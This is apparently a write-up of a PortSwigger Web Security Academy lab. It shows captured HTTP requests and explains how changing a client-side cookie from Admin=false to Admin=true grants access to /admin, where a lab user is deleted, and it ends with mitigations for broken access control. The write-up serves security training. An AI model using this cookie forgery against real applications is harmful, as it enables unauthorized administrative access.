# User role controlled by request parameter

<aside>
❓ This lab has an admin panel at `/admin`, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

</aside>

In this post, I’ll walk through a vulnerability I encountered where a web application controls user roles via a modifiable client-side cookie. This misconfiguration allowed me to escalate privileges and perform administrative actions by simply altering a value in my browser.

The application included an admin panel located at `/admin`, and my goal was to gain access to that panel and delete a user named `carlos`.

---

## **Step 1: Logging In as a Regular User**

![image.png](User%20role%20controlled%20by%20request%20parameter/1f8432fc-cd8a-4c92-87be-ffc58fd77f7d.png)

I began by using Burp Suite’s Intercept feature to monitor the login process. The login request looked like this:

```bash
POST /login HTTP/2
Host: .web-security-academy.net
Cookie: session=TWRL33mm0Ww3VnpYjM6OPvSk1QqbmFPG
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0afe00c00336638482ab8374004a0054.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afe00c00336638482ab8374004a0054.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=nQPNqJQmCqEZdtPlaqsf3hHDEZx9utE1&username=wiener&password=peter
```

After a successful login, the response included the following cookies:

```bash
GET /my-account?id=wiener HTTP/2
Host: .web-security-academy.net
Cookie: Admin=false; session=PWIckmIg1EuMTho9CKsUOSl2qC0a3Qwi
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0afe00c00336638482ab8374004a0054.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The presence of the `Admin=false` cookie indicated that the application was relying on the client to indicate administrative status, something I knew I could potentially exploit.

---

## **Step 2: Verifying Access Control**

Next, I accessed the `/my-account?id=wiener` page and confirmed the cookie was being sent in the request:

```bash
GET /my-account?id=wiener HTTP/2
Host: <target>
Cookie: Admin=false; session=<value>
```

I was able to view the account page, but attempts to visit /admin with the Admin=false cookie were blocked.

---

## **Step 3: Escalating Privileges**

To test whether the role check was truly client-side, I manually edited the cookie in Burp Suite:

```bash
Cookie: Admin=true; session=<value>
```

I resent the request to /admin and it worked. I now had full access to the admin panel. This confirmed that the application was trusting the Admin cookie without any server-side verification.

![image.png](User%20role%20controlled%20by%20request%20parameter/8873f710-9d59-40a2-92f4-48745a313931.png)

---

## **Step 4: Deleting Carlos**

![image.png](User%20role%20controlled%20by%20request%20parameter/image.png)

Inside the admin interface, I found functionality to manage users. I selected the user carlos and executed the deletion command. The lab was completed successfully, and the vulnerability was confirmed.

---

## **Security Implications**

This issue stemmed from the server relying on client-side information to enforce access control. It’s a textbook example of [**Broken Access Control**](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), one of the most critical risks in the OWASP Top 10.

---

## **Mitigations**

Based on what I observed, here are some best practices to mitigate such vulnerabilities:

1. **Never trust the client to enforce access control.** Always validate roles and permissions server-side.
2. **Use secure session management.** Role information should be stored on the server or securely embedded in tamper-proof tokens (e.g., signed JWTs).
3. **Validate every sensitive request.** Even if the client hides certain UI elements, the server must enforce all access restrictions independently.
4. **Perform regular security assessments.** Code reviews and penetration testing are essential for catching these kinds of flaws early.


---

<style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');

        * {
            font-weight: 400;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #101214;
            color: #fff;
            font-family: 'Montserrat', sans-serif;
        }

        .banner-container {
            display: flex;
            height: 50vh;
        }

        .left-panel, .right-panel {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 50px;
        }

        .left-panel {
            position: relative;
            border-radius: 50px;
            overflow: hidden;
        }

        .left-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url("https://i.imgur.com/xk7Q0EW.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            filter: blur(3px);
            z-index: -1;
        }

        .card {
            position: relative;
            background-color: rgba(38, 38, 38, 0.7);
            padding: 25px;
            border-radius: 30px;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 400px;
        }

        .card h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: #fff;
        }

        .social-links {
            margin-top: 20px;
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }

        .social-links a {
            display: inline-block;
            text-decoration: none;
        }

        .social-links img {
            width: 150px;
            max-width: 150px;
            height: 40px;
            object-fit: cover;
        }

        /* Media query for mobile */
        @media (max-width: 768px) {
            .social-links {
                grid-template-columns: 1fr;
            }
        }

        .codex-button {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #030e14;
            color: #ffffff;
            padding: 6px 12px;
            border-radius: 4px;
            font-family: 'Montserrat', sans-serif;
            font-size: 15px;
            font-weight: bold;
            height: 40px;
            text-decoration: none;
        }

        .codex-button img {
            height: 24px;
            width: auto;
            margin-right: 8px;
        }

        .right-panel {
            background-color: #111314;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .right-panel img {
            width: 300px;
            margin-bottom: 20px;
        }

        .right-panel h2 {
            font-size: 2.5rem;
            margin: 10px 0;
        }

        .right-panel p {
            font-size: 1.2rem;
            color: #ff8800;
        }

    </style>

<div class="banner-container">
        <div class="left-panel">
            <div class="card">
                <h2>Let's Connect!</h2>
                <div class="social-links">
                    <a href="https://github.com/L0WK3Y-IAAN" target="_blank">
                        <img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
                    </a>
                    <a href="https://www.linkedin.com/in/iaansec/" target="_blank">
                        <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
                    </a>
                </div>
            </div>
        </div>
    </div>
